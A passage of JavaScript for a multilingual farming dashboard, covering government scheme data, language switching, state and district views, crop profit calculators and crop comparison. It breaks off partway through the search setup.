    { id: "microirrigation", title: { en: "Micro Irrigation Fund Scheme", mr: "सूक्ष्म सिंचन निधी योजना", hi: "सूक्ष्म सिंचन निधि योजना" }, description: { en: "Promotes micro-irrigation for water use efficiency", mr: "पाणी वापर कार्यक्षमतेसाठी सूक्ष्म-सिंचनास प्रोत्साहन देते", hi: "जल उपयोग दक्षता के लिए सूक्ष्म-सिंचन को बढ़ावा देता है" }, benefits: { en: "Up to 55% subsidy on micro-irrigation systems", mr: "सूक्ष्म-सिंचन प्रणालींवर ५५% पर्यंत अनुदान", hi: "सूक्ष्म-सिंचन प्रणालियों पर ५५% तक सब्सिडी" } },
    { id: "soilhealth", title: { en: "Soil Health Card Scheme", mr: "मृदा आरोग्य पत्रक योजना", hi: "मृदा स्वास्थ्य कार्ड योजना" }, description: { en: "Provides soil health cards to farmers every 2 years", mr: "दर २ वर्षांनी शेतकऱ्यांना मृदा आरोग्य पत्रके प्रदान करते", hi: "हर २ साल में किसानों को मृदा स्वास्थ्य कार्ड प्रदान करता है" }, benefits: { en: "Customized fertilizer recommendations", mr: "सानुकूलित खत शिफारसी", hi: "अनुकूलित उर्वरक सिफारिशें" } },
    { id: "kcc", title: { en: "Kisan Credit Card (KCC) Scheme", mr: "किसान क्रेडिट कार्ड (केसीसी) योजना", hi: "किसान क्रेडिट कार्ड (केसीसी) योजना" }, description: { en: "Provides affordable credit to farmers", mr: "शेतकऱ्यांना परवडणारे कर्ज प्रदान करते", hi: "किसानों को किफायती ऋण प्रदान करता है" }, benefits: { en: "Credit up to ₹3 lakh at 4% interest per annum", mr: "दरवर्षी ४% व्याजदराने ₹३ लाख पर्यंत कर्ज", hi: "प्रति वर्ष ४% ब्याज दर पर ₹३ लाख तक ऋण" } }
];

// ============================================
// GLOBAL VARIABLES
// ============================================
let currentState = null;
let currentDistrict = null;
let currentLanguage = 'mr';
let chatbotMode = null;

const pages = {
    dashboard: document.getElementById('dashboardPage'),
    states: document.getElementById('statesPage'),
    districts: document.getElementById('districtsPage'),
    districtDetails: document.getElementById('districtDetailsPage'),
    governmentSchemes: document.getElementById('governmentSchemesPage'),
    districtCompare: document.getElementById('districtComparePage'),
    about: document.getElementById('aboutPage'),
    calculator: document.getElementById('calculatorPage'),
    profile: document.getElementById('profilePage')
};

// ============================================
// LANGUAGE FUNCTIONS
// ============================================
function changeLanguage(lang) {
    currentLanguage = lang;
    document.querySelectorAll('.language-switcher .lang-btn, .login-lang-btn').forEach(btn => {
        btn.classList.remove('active');
        if (btn.dataset.lang === lang) btn.classList.add('active');
    });
    updateTranslations();

    if (document.getElementById('mainApp').classList.contains('authenticated')) {
        renderStatesOnDashboard();
        renderStatesGrid();
        if (currentState) renderDistricts(currentState.id);
        if (currentDistrict) {
            loadDistrictDetails(currentState, currentDistrict);
            setupDistrictCalculator(currentState, currentDistrict);
        }
        loadGovernmentSchemes();
        setupDistrictComparison();
        updateChatbotFeatures();
        updateChatbotWelcome();
    }
}

function updateTranslations() {
    document.querySelectorAll('[data-translate]').forEach(el => {
        const key = el.dataset.translate;
        if (translations[currentLanguage]?.[key]) {
            if (el.tagName === 'INPUT' || el.tagName === 'TEXTAREA') el.placeholder = translations[currentLanguage][key];
            else if (!el.id || (el.id !== 'profileUserName' && el.id !== 'profileUserEmail')) {
                el.textContent = translations[currentLanguage][key];
            }
        }
    });
    document.querySelectorAll('[data-translate-placeholder]').forEach(el => {
        const key = el.dataset.translatePlaceholder;
        if (translations[currentLanguage]?.[key]) el.placeholder = translations[currentLanguage][key];
    });
    document.querySelectorAll('option[data-translate]').forEach(opt => {
        const key = opt.dataset.translate;
        if (translations[currentLanguage]?.[key]) opt.textContent = translations[currentLanguage][key];
    });
}

function showPage(pageName) {
    Object.values(pages).forEach(page => page?.classList.remove('active'));
    if (pages[pageName]) pages[pageName].classList.add('active');
}

// ============================================
// DASHBOARD FUNCTIONS
// ============================================
function initDashboardFeatures() {
    updateStats();
    renderStatesOnDashboard();
    renderStatesGrid();
    setupSearchFunctionality();
    loadGovernmentSchemes();
    setupDistrictComparison();
    setupCalculators();

    // Set up chatbot event listeners
    document.getElementById('openChatbot')?.addEventListener('click', toggleChatbot);
    document.getElementById('closeChatbot')?.addEventListener('click', toggleChatbot);
    document.getElementById('sendChatbotMessage')?.addEventListener('click', sendChatbotMessage);
    document.getElementById('chatbotInput')?.addEventListener('keypress', function (e) {
        if (e.key === 'Enter') sendChatbotMessage();
    });

    updateChatbotFeatures();
    showPage('dashboard');
}

function updateStats() {
    let totalDistricts = 0;
    statesData.forEach(state => totalDistricts += state.districts.length);
    document.getElementById('statesCount').textContent = statesData.length;
    document.getElementById('districtsCount').textContent = totalDistricts;
}

function renderStatesOnDashboard() {
    const container = document.getElementById('dashboardStatesGrid');
    if (!container) return;
    container.innerHTML = '';
    statesData.forEach(state => {
        const card = document.createElement('div');
        card.className = 'state-card';
        card.innerHTML = `
            <div class="state-icon"><i class="${state.icon}"></i></div>
            <div class="state-name">${state.name[currentLanguage]}</div>
            <div class="state-info">${state.districts.length} ${translations[currentLanguage]['districts']}</div>
            <div class="btn btn-primary" style="margin-top: 10px;" onclick="selectState('${state.id}')">
                <i class="fas fa-arrow-right"></i> ${translations[currentLanguage]['btn_explore']}
            </div>
        `;
        container.appendChild(card);
    });
}

function renderStatesGrid() {
    const container = document.getElementById('statesGrid');
    if (!container) return;
    container.innerHTML = '';
    statesData.forEach(state => {
        const card = document.createElement('div');
        card.className = 'state-card';
        card.innerHTML = `
            <div class="state-icon"><i class="${state.icon}"></i></div>
            <div class="state-name">${state.name[currentLanguage]}</div>
            <div class="state-info">${state.description[currentLanguage]}</div>
            <div class="state-info">${state.districts.length} ${translations[currentLanguage]['districts']}</div>
            <div class="btn btn-primary" style="margin-top: 10px;" onclick="selectState('${state.id}')">
                <i class="fas fa-arrow-right"></i> ${translations[currentLanguage]['view_details']}
            </div>
        `;
        container.appendChild(card);
    });
}

function selectState(stateId) {
    currentState = statesData.find(state => state.id === stateId);
    showPage('districts');
    document.getElementById('districtsPageTitle').textContent = `${currentState.name[currentLanguage]} ${translations[currentLanguage]['districts']}`;
    document.getElementById('districtsPageDescription').textContent = `${currentState.name[currentLanguage]} - ${currentState.description[currentLanguage]}`;
    renderDistricts(stateId);
}

function renderDistricts(stateId) {
    const state = statesData.find(s => s.id === stateId);
    const container = document.getElementById('districtsGrid');
    if (!container || !state) return;
    container.innerHTML = '';
    state.districts.forEach(district => {
        const card = document.createElement('div');
        card.className = 'district-card';
        card.innerHTML = `
            <div class="district-icon"><i class="fas fa-seedling"></i></div>
            <div class="district-name">${district.name[currentLanguage]}</div>
            <div class="district-crops"><strong>${translations[currentLanguage]['top_crops']}:</strong> ${district.crops[currentLanguage]}</div>
            <div class="district-crops"><strong>${translations[currentLanguage]['season']}:</strong> ${district.season[currentLanguage]}</div>
            <div class="district-season">${district.season[currentLanguage]}</div>
            <div class="btn btn-primary" style="margin-top: 15px;" onclick="selectDistrict('${stateId}', '${district.id}')">
                <i class="fas fa-chart-bar"></i> ${translations[currentLanguage]['view_details']}
            </div>
        `;
        container.appendChild(card);
    });
    document.getElementById('districtSearchCount').textContent = `${translations[currentLanguage]['showing_districts']} ${state.districts.length}`;
}

function selectDistrict(stateId, districtId) {
    const state = statesData.find(s => s.id === stateId);
    const district = state.districts.find(d => d.id === districtId);
    currentDistrict = district;
    showPage('districtDetails');
    loadDistrictDetails(state, district);
    setupDistrictCalculator(state, district);
}

function loadDistrictDetails(state, district) {
    const districtInfo = districtInfoData[district.id];
    if (!districtInfo) return;

    document.getElementById('districtDetailsTitle').textContent = `${district.name[currentLanguage]} ${translations[currentLanguage]['district'] || 'District'}, ${state.name[currentLanguage]}`;

    const table = document.getElementById('districtInfoTable');
    table.innerHTML = `
        <tr><th>${translations[currentLanguage]['state']}</th><td>${state.name[currentLanguage]}</td></tr>
        <tr><th>${translations[currentLanguage]['top_crops']}</th><td>${district.crops[currentLanguage]}</td></tr>
        <tr><th>${translations[currentLanguage]['season']}</th><td>${district.season[currentLanguage]}</td></tr>
        <tr><th>${translations[currentLanguage]['market_demand']}</th><td><span class="tag ${getDemandClass(districtInfo.demand.en)}">${districtInfo.demand[currentLanguage]}</span></td></tr>
        <tr><th>${translations[currentLanguage]['risk_level']}</th><td><span class="tag ${getRiskClass(districtInfo.risk.en)}">${districtInfo.risk[currentLanguage]}</span></td></tr>
        <tr><th>${translations[currentLanguage]['export_potential']}</th><td><span class="tag ${getExportClass(districtInfo.exportPotential.en)}">${districtInfo.exportPotential[currentLanguage]}</span></td></tr>
        <tr><th>${translations[currentLanguage]['global_market_access']}</th><td><span class="tag ${getMarketClass(districtInfo.globalMarketAccess.en)}">${districtInfo.globalMarketAccess[currentLanguage]}</span></td></tr>
        <tr><th>${translations[currentLanguage]['nearest_market']}</th><td>${districtInfo.nearestMarket[currentLanguage]}</td></tr>
    `;

    document.getElementById('districtRecommendations').innerHTML = getDistrictRecommendations(districtInfo);

    loadDistrictMap(district);
    loadDistrictYoutubeVideos(district);
}

function getDemandClass(demand) {
    switch (demand.toLowerCase()) {
        case 'high': return 'tag-high';
        case 'medium': return 'tag-medium';
        case 'low': return 'tag-low';
        default: return 'tag-medium';
    }
}

function getRiskClass(risk) {
    switch (risk.toLowerCase()) {
        case 'high': return 'tag-low';
        case 'medium': return 'tag-medium';
        case 'low': return 'tag-high';
        default: return 'tag-medium';
    }
}

function getExportClass(exportPotential) {
    switch (exportPotential.toLowerCase()) {
        case 'high': return 'tag-high';
        case 'medium': return 'tag-medium';
        case 'low': return 'tag-low';
        default: return 'tag-medium';
    }
}

function getMarketClass(marketAccess) {
    switch (marketAccess.toLowerCase()) {
        case 'high': return 'tag-high';
        case 'medium': return 'tag-medium';
        case 'low': return 'tag-low';
        default: return 'tag-medium';
    }
}

function getDistrictRecommendations(districtInfo) {
    let recommendations = [];
    if (districtInfo.demand.en === 'High') recommendations.push(translations[currentLanguage]['recommend_high_demand']);
    if (districtInfo.risk.en === 'High') recommendations.push(translations[currentLanguage]['recommend_high_risk']);
    else if (districtInfo.risk.en === 'Low') recommendations.push(translations[currentLanguage]['recommend_low_risk']);
    if (districtInfo.exportPotential.en === 'High') recommendations.push(translations[currentLanguage]['recommend_export']);
    if (districtInfo.globalMarketAccess.en === 'High') recommendations.push(translations[currentLanguage]['recommend_market']);
    return recommendations.join(' ');
}

function loadDistrictMap(district) {
    const container = document.getElementById('districtMapContainer');
    const placeholder = translations[currentLanguage]['map_placeholder'].replace('{district}', district.name[currentLanguage]);
    container.innerHTML = `
        <div class="upload-placeholder">
            <i class="fas fa-map-marked-alt"></i>
            <h4>${translations[currentLanguage]['district_map']}</h4>
            <p style="color: var(--text-light); margin-top: 10px;">${placeholder}</p>
        </div>
    `;
}

function loadDistrictYoutubeVideos(district) {
    const container = document.getElementById('youtubeVideosContainer');
    const placeholder = translations[currentLanguage]['video_placeholder'].replace('{district}', district.name[currentLanguage]);
    container.innerHTML = `
        <div class="video-placeholder">
            <i class="fab fa-youtube"></i>
            <h4>${translations[currentLanguage]['youtube_resources']}</h4>
            <p style="color: var(--text-light); margin-top: 10px;">${placeholder}</p>
        </div>
    `;
}

function formatNumber(num) {
    if (num >= 10000000) return (num / 10000000).toFixed(2) + ' Cr';
    else if (num >= 100000) return (num / 100000).toFixed(2) + ' L';
    else return num.toFixed(0).replace(/\B(?=(\d{3})+(?!\d))/g, ',');
}

// ============================================
// CALCULATOR FUNCTIONS
// ============================================
function setupCalculators() {
    document.getElementById('calculateBtn')?.addEventListener('click', calculateBasicProfit);
    document.getElementById('resetBtn')?.addEventListener('click', resetBasicCalculator);
    document.getElementById('advancedCalculateBtn')?.addEventListener('click', calculateAdvancedProfit);
    document.getElementById('advancedResetBtn')?.addEventListener('click', resetAdvancedCalculator);
    document.getElementById('compareCropsBtn')?.addEventListener('click', compareCrops);
    document.getElementById('generalCalculateBtn')?.addEventListener('click', calculateGeneralProfit);
    document.getElementById('generalResetBtn')?.addEventListener('click', resetGeneralCalculator);
    document.getElementById('advancedGeneralCalculateBtn')?.addEventListener('click', calculateAdvancedGeneralProfit);
    document.getElementById('advancedGeneralResetBtn')?.addEventListener('click', resetAdvancedGeneralCalculator);

    document.querySelectorAll('.calculator-tabs .tab-btn').forEach(btn => {
        btn.addEventListener('click', function () { switchDistrictCalculatorTab(this.dataset.tab); });
    });
    document.querySelectorAll('.calculator-tabs-container .tab-btn').forEach(btn => {
        btn.addEventListener('click', function () { switchCalculatorPageTab(this.dataset.tab); });
    });
}

function switchDistrictCalculatorTab(tabId) {
    document.querySelectorAll('.calculator-tabs .tab-btn').forEach(b => b.classList.remove('active'));
    document.querySelectorAll('#profitCalculator .tab-content').forEach(c => c.classList.remove('active'));
    document.querySelector(`.calculator-tabs .tab-btn[data-tab="${tabId}"]`)?.classList.add('active');
    document.getElementById(tabId + 'Tab')?.classList.add('active');
}

function switchCalculatorPageTab(tabId) {
    document.querySelectorAll('.calculator-tabs-container .tab-btn').forEach(b => b.classList.remove('active'));
    document.querySelectorAll('#calculatorPage .tab-content').forEach(c => c.classList.remove('active'));
    document.querySelector(`.calculator-tabs-container .tab-btn[data-tab="${tabId}"]`)?.classList.add('active');
    document.getElementById(tabId)?.classList.add('active');
}

function setupDistrictCalculator(state, district) {
    document.getElementById('calculatorTitle').textContent = `${district.name[currentLanguage]} ${translations[currentLanguage]['calculator_title']}`;
    document.getElementById('calculatorSubtitle').textContent = `${translations[currentLanguage]['calculator_subtitle']} ${district.name[currentLanguage]}, ${state.name[currentLanguage]}`;

    const crops = district.crops[currentLanguage].split(', ').map(c => c.trim());
    ['cropSelect', 'advancedCropSelect', 'crop1Select', 'crop2Select'].forEach(selectId => {
        const select = document.getElementById(selectId);
        if (select) {
            select.innerHTML = `<option value="">${translations[currentLanguage]['select_crop1']}</option>` +
                crops.map(crop => `<option value="${crop}">${crop}</option>`).join('');
        }
    });

    if (crops.length > 0) {
        const firstCrop = crops[0];
        const cropKey = Object.keys(cropData).find(key =>
            firstCrop.toLowerCase().includes(key.toLowerCase()) ||
            translations[currentLanguage][`crop_${key.toLowerCase()}`]?.toLowerCase().includes(firstCrop.toLowerCase())
        );
        if (cropKey && cropData[cropKey]) {
            const data = cropData[cropKey];
            document.getElementById('yieldInput').value = Math.round(data.pricePerTon / 1000);
            document.getElementById('priceInput').value = data.pricePerTon / 10;
            document.getElementById('advancedYieldInput').value = Math.round(data.pricePerTon / 1000);
            document.getElementById('advancedPriceInput').value = data.pricePerTon / 10;
        }
    }
    resetBasicCalculator();
    resetAdvancedCalculator();
    if (document.getElementById('cropComparisonResults')) {
        document.getElementById('cropComparisonResults').style.display = 'none';
    }
}

function calculateBasicProfit() {
    const crop = document.getElementById('cropSelect')?.value;
    const area = parseFloat(document.getElementById('areaInput')?.value);
    const yieldPerAcre = parseFloat(document.getElementById('yieldInput')?.value);
    const price = parseFloat(document.getElementById('priceInput')?.value);
    if (!crop || !area || !yieldPerAcre || !price) {
        alert(translations[currentLanguage]['alert_fill_fields']);
        return;
    }
    const totalExpenses = area * 20000;
    const totalYield = area * yieldPerAcre;
    const totalRevenue = totalYield * price;
    const totalProfit = totalRevenue - totalExpenses;
    const profitPerAcre = totalProfit / area;
    const roi = (totalProfit / totalExpenses) * 100;

    document.getElementById('resultsSection').style.display = 'block';
    const profitBadge = document.getElementById('profitBadge');
    if (totalProfit >= 0) {
        profitBadge.className = 'profit-badge profit-positive';
        profitBadge.textContent = translations[currentLanguage]['profit'];
    } else {
        profitBadge.className = 'profit-badge profit-negative';
        profitBadge.textContent = translations[currentLanguage]['loss'];
    }
    document.getElementById('resultsGrid').innerHTML = `
        <div class="result-item"><div class="result-label">${translations[currentLanguage]['revenue']}</div><div class="result-value">₹${formatNumber(totalRevenue)}</div></div>
        <div class="result-item"><div class="result-label">${translations[currentLanguage]['expenses']}</div><div class="result-value">₹${formatNumber(totalExpenses)}</div></div>
        <div class="result-item"><div class="result-label">${translations[currentLanguage]['profit']}</div><div class="result-value ${totalProfit < 0 ? 'negative' : ''}">₹${formatNumber(totalProfit)}</div></div>
        <div class="result-item"><div class="result-label">${translations[currentLanguage]['profit_per_acre']}</div><div class="result-value ${profitPerAcre < 0 ? 'negative' : ''}">₹${formatNumber(profitPerAcre)}</div></div>
        <div class="result-item"><div class="result-label">ROI</div><div class="result-value ${roi < 0 ? 'negative' : ''}">${roi.toFixed(1)}%</div></div>
    `;
}

function resetBasicCalculator() {
    document.getElementById('areaInput').value = 1;
    document.getElementById('yieldInput').value = 8;
    document.getElementById('priceInput').value = 6500;
    document.getElementById('resultsSection').style.display = 'none';
}

function calculateAdvancedProfit() {
    const crop = document.getElementById('advancedCropSelect')?.value;
    const area = parseFloat(document.getElementById('advancedAreaInput')?.value);
    const yieldPerAcre = parseFloat(document.getElementById('advancedYieldInput')?.value);
    const price = parseFloat(document.getElementById('advancedPriceInput')?.value);
    const seeds = parseFloat(document.getElementById('seedsCost')?.value);
    const fertilizer = parseFloat(document.getElementById('fertilizerCost')?.value);
    const pesticide = parseFloat(document.getElementById('pesticideCost')?.value);
    const irrigation = parseFloat(document.getElementById('irrigationCost')?.value);
    const labor = parseFloat(document.getElementById('laborCost')?.value);
    const other = parseFloat(document.getElementById('otherCost')?.value);

    if (!crop || !area || !yieldPerAcre || !price) {
        alert(translations[currentLanguage]['alert_fill_fields']);
        return;
    }
    const expensesPerAcre = seeds + fertilizer + pesticide + irrigation + labor + other;
    const totalExpenses = area * expensesPerAcre;
    const totalYield = area * yieldPerAcre;
    const totalRevenue = totalYield * price;
    const totalProfit = totalRevenue - totalExpenses;
    const profitPerAcre = totalProfit / area;
    const roi = (totalProfit / totalExpenses) * 100;

    document.getElementById('advancedResultsSection').style.display = 'block';
    const profitBadge = document.getElementById('advancedProfitBadge');
    if (totalProfit >= 0) {
        profitBadge.className = 'profit-badge profit-positive';
        profitBadge.textContent = translations[currentLanguage]['profit'];
    } else {
        profitBadge.className = 'profit-badge profit-negative';
        profitBadge.textContent = translations[currentLanguage]['loss'];
    }
    document.getElementById('advancedResultsGrid').innerHTML = `
        <div class="result-item"><div class="result-label">${translations[currentLanguage]['revenue']}</div><div class="result-value">₹${formatNumber(totalRevenue)}</div></div>
        <div class="result-item"><div class="result-label">${translations[currentLanguage]['expenses']}</div><div class="result-value">₹${formatNumber(totalExpenses)}</div></div>
        <div class="result-item"><div class="result-label">${translations[currentLanguage]['expense_breakdown']}</div><div class="result-value" style="font-size: 1rem;">
            ${translations[currentLanguage]['label_seeds']}: ₹${formatNumber(seeds * area)}<br>
            ${translations[currentLanguage]['label_fertilizer']}: ₹${formatNumber(fertilizer * area)}<br>
            ${translations[currentLanguage]['label_pesticide']}: ₹${formatNumber(pesticide * area)}<br>
            ${translations[currentLanguage]['label_irrigation']}: ₹${formatNumber(irrigation * area)}<br>
            ${translations[currentLanguage]['label_labor']}: ₹${formatNumber(labor * area)}<br>
            ${translations[currentLanguage]['label_other']}: ₹${formatNumber(other * area)}
        </div></div>
        <div class="result-item"><div class="result-label">${translations[currentLanguage]['profit']}</div><div class="result-value ${totalProfit < 0 ? 'negative' : ''}">₹${formatNumber(totalProfit)}</div></div>
        <div class="result-item"><div class="result-label">${translations[currentLanguage]['profit_per_acre']}</div><div class="result-value ${profitPerAcre < 0 ? 'negative' : ''}">₹${formatNumber(profitPerAcre)}</div></div>
        <div class="result-item"><div class="result-label">ROI</div><div class="result-value ${roi < 0 ? 'negative' : ''}">${roi.toFixed(1)}%</div></div>
    `;
}

function resetAdvancedCalculator() {
    document.getElementById('advancedAreaInput').value = 1;
    document.getElementById('advancedYieldInput').value = 8;
    document.getElementById('advancedPriceInput').value = 6500;
    document.getElementById('seedsCost').value = 2000;
    document.getElementById('fertilizerCost').value = 4500;
    document.getElementById('pesticideCost').value = 3000;
    document.getElementById('irrigationCost').value = 2500;
    document.getElementById('laborCost').value = 8000;
    document.getElementById('otherCost').value = 2000;
    document.getElementById('advancedResultsSection').style.display = 'none';
}

function calculateGeneralProfit() {
    const crop = document.getElementById('generalCropSelect')?.value;
    const area = parseFloat(document.getElementById('generalAreaInput')?.value);
    const yieldPerAcre = parseFloat(document.getElementById('generalYieldInput')?.value);
    const price = parseFloat(document.getElementById('generalPriceInput')?.value);
    if (!crop || !area || !yieldPerAcre || !price) {
        alert(translations[currentLanguage]['alert_fill_fields']);
        return;
    }
    const totalExpenses = area * 20000;
    const totalYield = area * yieldPerAcre;
    const totalRevenue = totalYield * price;
    const totalProfit = totalRevenue - totalExpenses;
    const profitPerAcre = totalProfit / area;
    const roi = (totalProfit / totalExpenses) * 100;

    document.getElementById('generalResultsSection').style.display = 'block';
    const profitBadge = document.getElementById('generalProfitBadge');
    if (totalProfit >= 0) {
        profitBadge.className = 'profit-badge profit-positive';
        profitBadge.textContent = translations[currentLanguage]['profit'];
    } else {
        profitBadge.className = 'profit-badge profit-negative';
        profitBadge.textContent = translations[currentLanguage]['loss'];
    }
    document.getElementById('generalResultsGrid').innerHTML = `
        <div class="result-item"><div class="result-label">${translations[currentLanguage]['revenue']}</div><div class="result-value">₹${formatNumber(totalRevenue)}</div></div>
        <div class="result-item"><div class="result-label">${translations[currentLanguage]['expenses']}</div><div class="result-value">₹${formatNumber(totalExpenses)}</div></div>
        <div class="result-item"><div class="result-label">${translations[currentLanguage]['profit']}</div><div class="result-value ${totalProfit < 0 ? 'negative' : ''}">₹${formatNumber(totalProfit)}</div></div>
        <div class="result-item"><div class="result-label">${translations[currentLanguage]['profit_per_acre']}</div><div class="result-value ${profitPerAcre < 0 ? 'negative' : ''}">₹${formatNumber(profitPerAcre)}</div></div>
        <div class="result-item"><div class="result-label">ROI</div><div class="result-value ${roi < 0 ? 'negative' : ''}">${roi.toFixed(1)}%</div></div>
    `;
}

function resetGeneralCalculator() {
    document.getElementById('generalAreaInput').value = 1;
    document.getElementById('generalYieldInput').value = 10;
    document.getElementById('generalPriceInput').value = 5000;
    document.getElementById('generalResultsSection').style.display = 'none';
}

function calculateAdvancedGeneralProfit() {
    const crop = document.getElementById('advancedGeneralCropSelect')?.value;
    const area = parseFloat(document.getElementById('advancedGeneralAreaInput')?.value);
    const yieldPerAcre = parseFloat(document.getElementById('advancedGeneralYieldInput')?.value);
    const price = parseFloat(document.getElementById('advancedGeneralPriceInput')?.value);
    const seeds = parseFloat(document.getElementById('advancedGeneralSeedsCost')?.value);
    const fertilizer = parseFloat(document.getElementById('advancedGeneralFertilizerCost')?.value);
    const pesticide = parseFloat(document.getElementById('advancedGeneralPesticideCost')?.value);
    const irrigation = parseFloat(document.getElementById('advancedGeneralIrrigationCost')?.value);
    const labor = parseFloat(document.getElementById('advancedGeneralLaborCost')?.value);
    const other = parseFloat(document.getElementById('advancedGeneralOtherCost')?.value);

    if (!crop || !area || !yieldPerAcre || !price) {
        alert(translations[currentLanguage]['alert_fill_fields']);
        return;
    }
    const expensesPerAcre = seeds + fertilizer + pesticide + irrigation + labor + other;
    const totalExpenses = area * expensesPerAcre;
    const totalYield = area * yieldPerAcre;
    const totalRevenue = totalYield * price;
    const totalProfit = totalRevenue - totalExpenses;
    const profitPerAcre = totalProfit / area;
    const roi = (totalProfit / totalExpenses) * 100;

    document.getElementById('advancedGeneralResultsSection').style.display = 'block';
    const profitBadge = document.getElementById('advancedGeneralProfitBadge');
    if (totalProfit >= 0) {
        profitBadge.className = 'profit-badge profit-positive';
        profitBadge.textContent = translations[currentLanguage]['profit'];
    } else {
        profitBadge.className = 'profit-badge profit-negative';
        profitBadge.textContent = translations[currentLanguage]['loss'];
    }
    document.getElementById('advancedGeneralResultsGrid').innerHTML = `
        <div class="result-item"><div class="result-label">${translations[currentLanguage]['revenue']}</div><div class="result-value">₹${formatNumber(totalRevenue)}</div></div>
        <div class="result-item"><div class="result-label">${translations[currentLanguage]['expenses']}</div><div class="result-value">₹${formatNumber(totalExpenses)}</div></div>
        <div class="result-item"><div class="result-label">${translations[currentLanguage]['expense_breakdown']}</div><div class="result-value" style="font-size: 1rem;">
            ${translations[currentLanguage]['label_seeds']}: ₹${formatNumber(seeds * area)}<br>
            ${translations[currentLanguage]['label_fertilizer']}: ₹${formatNumber(fertilizer * area)}<br>
            ${translations[currentLanguage]['label_pesticide']}: ₹${formatNumber(pesticide * area)}<br>
            ${translations[currentLanguage]['label_irrigation']}: ₹${formatNumber(irrigation * area)}<br>
            ${translations[currentLanguage]['label_labor']}: ₹${formatNumber(labor * area)}<br>
            ${translations[currentLanguage]['label_other']}: ₹${formatNumber(other * area)}
        </div></div>
        <div class="result-item"><div class="result-label">${translations[currentLanguage]['profit']}</div><div class="result-value ${totalProfit < 0 ? 'negative' : ''}">₹${formatNumber(totalProfit)}</div></div>
        <div class="result-item"><div class="result-label">${translations[currentLanguage]['profit_per_acre']}</div><div class="result-value ${profitPerAcre < 0 ? 'negative' : ''}">₹${formatNumber(profitPerAcre)}</div></div>
        <div class="result-item"><div class="result-label">ROI</div><div class="result-value ${roi < 0 ? 'negative' : ''}">${roi.toFixed(1)}%</div></div>
    `;
}

function resetAdvancedGeneralCalculator() {
    document.getElementById('advancedGeneralAreaInput').value = 1;
    document.getElementById('advancedGeneralYieldInput').value = 10;
    document.getElementById('advancedGeneralPriceInput').value = 5000;
    document.getElementById('advancedGeneralSeedsCost').value = 2000;
    document.getElementById('advancedGeneralFertilizerCost').value = 3500;
    document.getElementById('advancedGeneralPesticideCost').value = 2500;
    document.getElementById('advancedGeneralIrrigationCost').value = 2000;
    document.getElementById('advancedGeneralLaborCost').value = 6000;
    document.getElementById('advancedGeneralOtherCost').value = 1500;
    document.getElementById('advancedGeneralResultsSection').style.display = 'none';
}

// ============================================
// CROP COMPARISON
// ============================================
function compareCrops() {
    const crop1 = document.getElementById('crop1Select')?.value;
    const crop2 = document.getElementById('crop2Select')?.value;
    if (!crop1 || !crop2) {
        alert(translations[currentLanguage]['alert_select_two']);
        return;
    }
    if (crop1 === crop2) {
        alert(translations[currentLanguage]['alert_select_different']);
        return;
    }

    const cropKey1 = Object.keys(cropData).find(key =>
        crop1.toLowerCase().includes(key.toLowerCase()) ||
        translations[currentLanguage][`crop_${key.toLowerCase()}`]?.toLowerCase().includes(crop1.toLowerCase())
    ) || crop1;
    const cropKey2 = Object.keys(cropData).find(key =>
        crop2.toLowerCase().includes(key.toLowerCase()) ||
        translations[currentLanguage][`crop_${key.toLowerCase()}`]?.toLowerCase().includes(crop2.toLowerCase())
    ) || crop2;

    const data1 = cropData[cropKey1] || { pricePerTon: 50000 };
    const data2 = cropData[cropKey2] || { pricePerTon: 50000 };

    const expenses1 = 20000;
    const revenue1 = 10 * (data1.pricePerTon / 10);
    const profit1 = revenue1 - expenses1;
    const roi1 = (profit1 / expenses1) * 100;
    const expenses2 = 20000;
    const revenue2 = 10 * (data2.pricePerTon / 10);
    const profit2 = revenue2 - expenses2;
    const roi2 = (profit2 / expenses2) * 100;
    const betterCrop = profit1 > profit2 ? crop1 : crop2;
    const betterProfit = Math.max(profit1, profit2);
    const betterROI = profit1 > profit2 ? roi1 : roi2;

    const container = document.getElementById('cropComparisonResults');
    container.style.display = 'block';
    container.innerHTML = `
        <h4 style="color: var(--dark-green); margin-bottom: 15px;">${translations[currentLanguage]['crop_comparison_results']}</h4>
        <table class="crop-comparison-table">
            <thead><tr><th>${translations[currentLanguage]['parameter']}</th><th>${crop1}</th><th>${crop2}</th></tr></thead>
            <tbody>
                <tr><td><strong>${translations[currentLanguage]['yield_per_acre']}</strong></td><td>10 quintals</td><td>10 quintals</td></tr>
                <tr><td><strong>${translations[currentLanguage]['price_per_quintal']}</strong></td><td>₹${formatNumber(data1.pricePerTon / 10)}</td><td>₹${formatNumber(data2.pricePerTon / 10)}</td></tr>
                <tr><td><strong>${translations[currentLanguage]['revenue_per_acre']}</strong></td><td>₹${formatNumber(revenue1)}</td><td>₹${formatNumber(revenue2)}</td></tr>
                <tr><td><strong>${translations[currentLanguage]['expenses_per_acre']}</strong></td><td>₹${formatNumber(expenses1)}</td><td>₹${formatNumber(expenses2)}</td></tr>
                <tr><td><strong>${translations[currentLanguage]['profit_per_acre']}</strong></td><td style="${profit1 >= profit2 ? 'background: #e8f5e9;' : ''}">₹${formatNumber(profit1)}</td>
                    <td style="${profit2 >= profit1 ? 'background: #e8f5e9;' : ''}">₹${formatNumber(profit2)}</td></tr>
                <tr><td><strong>ROI</strong></td><td style="${roi1 >= roi2 ? 'background: #e8f5e9;' : ''}">${roi1.toFixed(1)}%</td>
                    <td style="${roi2 >= roi1 ? 'background: #e8f5e9;' : ''}">${roi2.toFixed(1)}%</td></tr>
            </tbody>
        </table>
        <div style="margin-top: 20px; padding: 15px; background: ${profit1 > profit2 ? '#e8f5e9' : '#fff3e0'}; border-radius: 10px;">
            <h5 style="color: var(--dark-green); margin-bottom: 10px;"><i class="fas fa-trophy"></i> ${translations[currentLanguage]['recommendation']}</h5>
            <p style="color: var(--text-dark);">
                <strong>${betterCrop}</strong> ${translations[currentLanguage]['more_profitable']} - ${translations[currentLanguage]['estimated_profit']} <strong>₹${formatNumber(betterProfit)} ${translations[currentLanguage]['per_acre']}</strong> 
                ${translations[currentLanguage]['and']} ROI <strong>${betterROI.toFixed(1)}%</strong>.
            </p>
        </div>
    `;
}

// ============================================
// SEARCH FUNCTIONS
// ============================================
function setupSearchFunctionality() {
    const stateSearch = document.getElementById('stateSearchInput');
    const clearState = document.getElementById('clearStateSearch');
    if (stateSearch) {
        stateSearch.addEventListener('input', function () {
            const term = this.value.toLowerCase();
            const cards = document.querySelectorAll('#statesGrid .state-card');
            let count = 0;
            cards.forEach(card => {
                const name = card.querySelector('.state-name')?.textContent.toLowerCase() || '';
                if (name.includes(term)) {
                    card.style.display = 'block';
                    count++;
